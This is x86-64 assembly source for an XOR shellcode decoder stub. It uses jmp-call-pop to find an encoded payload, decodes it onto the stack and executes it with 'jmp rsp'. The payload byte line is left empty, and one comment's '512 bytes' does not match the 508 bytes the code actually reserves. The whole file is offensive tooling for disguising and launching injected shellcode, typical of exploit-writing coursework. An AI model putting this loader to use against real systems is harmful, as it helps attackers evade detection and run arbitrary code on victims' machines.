global _start

section .text

_start:
        jmp short call_shellcode

decoder:
        xor rax, rax
        xor rbx, rbx
        xor rcx, rcx
        xor rdx, rdx
        pop rsi             ; address of shellcode
        mov rdi, 0xaaaa9090 ; end of shellcode marker
        ; make room on the stack (512 bytes)
        sub rsp, 0x7f
        sub rsp, 0x7f
        sub rsp, 0x7f
        sub rsp, 0x7f

decode:
        ; read encoded bytes
        mov bl, byte [rsi + rdx + 1]
        mov bh, byte [rsi + rdx + 2]
        mov cl, byte [rsi + rdx + 3]
        mov ch, byte [rsi + rdx + 4]

        ; xor with the key bytes
        xor bl, byte [rsi + rdx]
        xor bh, byte [rsi + rdx]
        xor cl, byte [rsi + rdx]
        xor ch, byte [rsi + rdx]

        ; store in memory in reverse order to restore original shellcode
        mov byte [rsp + rax], ch
    	mov byte [rsp + rax + 1], cl
        mov byte [rsp + rax + 2], bh
        mov byte [rsp + rax + 3], bl

        cmp dword [rsi + rdx + 5], edi  ; check if we have reached the end of shellcode marker
        je execute_shellcode            ; if we do, jump to the shellcode and execute it

        add rdx, 5
        add rax, 4
        jnz decode

execute_shellcode:
        jmp rsp

call_shellcode:
        call decoder

encoder_shellcode: db 